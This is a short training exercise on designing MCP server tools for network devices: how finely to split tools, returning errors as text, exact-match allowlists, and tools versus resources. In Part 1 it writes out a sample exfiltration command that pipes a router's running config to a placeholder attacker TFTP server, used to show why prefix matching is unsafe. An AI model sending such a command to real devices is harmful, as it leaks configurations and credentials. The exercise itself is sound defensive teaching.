# Tool Design — Granularity, Schema, Errors

**Category:** 04 · Build an MCP Server · **Duration:** 8 min · **Runs on:** — · **Targets:** —

**Devices in play:** None — a design exercise grounded in the server code. No network device is reached.

## Introduction

You can write a tool. This exercise is about writing the *right* tools. Three design questions decide whether a server is pleasant or painful for a model to use:

1. **Granularity** — one tool per operator *intent*, or one per API *endpoint*?
2. **Error semantics** — what should a tool tell the agent when it refuses or fails?
3. **Tool vs resource** — when is a fact better served as a resource than a tool call?

No code to run. You'll reason about the real decisions already baked into `dynamic_show` and `_confirm_change` in `main.py`, then place three candidate tools on the design axis yourself.

## What You'll Learn

- One tool per operator intent versus one tool per API endpoint
- What an agent should be told when a call is rejected or a device is unreachable
- Why `dynamic_show` uses an exact-match allowlist and not a prefix match
- When a fact belongs in a resource rather than a tool

## Before You Start

- Exercise 4.2 complete

## Architecture Overview

Two real design decisions to study:

| Decision point | In the code | The design choice |
|---|---|---|
| **Error-as-result** | `dynamic_show` returns `"Command rejected: ..."` | the tool *returns* the refusal; the model reads and retries |
| **Confirm-as-result** | `_confirm_change` returns `(proceed, warning)` | refusal/degradation is data, never an exception |
| **Allowlist shape** | `ALLOWED_SHOW_COMMANDS` exact-match | an exact set, not a prefix — security, not convenience |

## Setup

### Step 1 — none

Open `main.py` to `dynamic_show` (line 264) and `_confirm_change` (line 193) as reference while you answer.

## Exercises

### Part 1 — the allowlist is exact-match on purpose (3 min)

`dynamic_show` normalizes the command and checks it against an **exact** set:

```python
normalized = " ".join(command.lower().split())
if normalized not in ALLOWED_SHOW_COMMANDS:
    return f"Command rejected: {command!r} is not on the allowlist. ..."
```

**A1.** Suppose someone "simplified" this to a **prefix** match — accept anything starting with `show `. Write the one command an attacker would send to exfiltrate the running config to a TFTP server.

> Answer to check yourself: `show running-config | redirect tftp://attacker/x` — it *starts with* `show ` but pipes the full config off-box. Prefix matching reopens exactly the bypass the exact-match allowlist closes. This is a tested rule (`test_safety.py::TestAllowlistStillHolds`); do not regress it.

### Part 2 — error semantics (2 min)

Every tool here returns problems as **text results**, never raises:

- rejected command → `"Command rejected: ..."`
- unreachable device → `"Error talking to <device>: ..."`
- role refusal → `"Refusing to configure ..."`

**B1.** Why is a returned-string refusal more useful to an *agent* than a raised exception that becomes a JSON-RPC transport error?

> Answer to check yourself: a transport error often just aborts the model's turn. A text result lands in the model's context, so it can read "not on the allowlist, here are the allowed commands" and *pick a valid one*. The error becomes a hint, not a dead end.

### Part 3 — place three tools on the axis (3 min)

For each candidate, decide **intent-shaped** (good) vs **endpoint-shaped** (leaky), and whether it should be a **tool** or a **resource**:

| Candidate | Intent or endpoint? | Tool or resource? |
|---|---|---|
| `ping_from_device(target, device)` (you built this) | | |
| `http_get(url)` — "call any REST endpoint on vManage" | | |
| "the device's current running-config" | | |

> Answer to check yourself: `ping_from_device` is **intent-shaped** (answers "can X reach Y") — good tool. `http_get(url)` is **endpoint-shaped** — it pushes vManage's whole API surface and its auth onto the model; prefer narrow tools like `get_tunnel_status`. The running-config is a **fact you read**, not an action — it belongs as a **resource** (`device://{device}/running-config`), which this server already exposes.

**Reflection Questions**

1. An operator asks "is the WAN healthy?". Is that one tool or several? What does each granularity choice cost the model?
2. When would exposing `dynamic_show` (a small allowlist) be *better* than ten named show-tools — and when worse?
3. The running-config is a resource here. What's the difference, to a model, between "call a tool to fetch config" and "read a resource that is config"?

## Verify

**Success Criteria**

- A written answer placing three candidate tools on the intent/endpoint axis
- You can state the error rule this server follows, and why it exists

**Done when:** your three-tool table is filled with a defensible intent/endpoint and tool/resource call for each, and you can state the error rule in one sentence.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| "both answers feel right" | granularity is a trade-off, not a rule | state the *cost* of each choice; that's the real answer |
| "why not just one `run_command` tool?" | it hands the model the whole CLI, unsafe surface | narrow, intent-named tools bound what can go wrong |

## Quick Reference

- **Granularity:** one tool per operator *intent*, not per API endpoint.
- **Errors:** return them as text results; never raise. The model reads and retries.
- **Allowlist:** exact-match, not prefix (prefix reopens `| redirect` exfiltration).
- **Tool vs resource:** an *action* is a tool; a *fact you read* is a resource.

---

**Source material:** No code. Grounded in `dynamic_show` and `_confirm_change` in `main.py`.
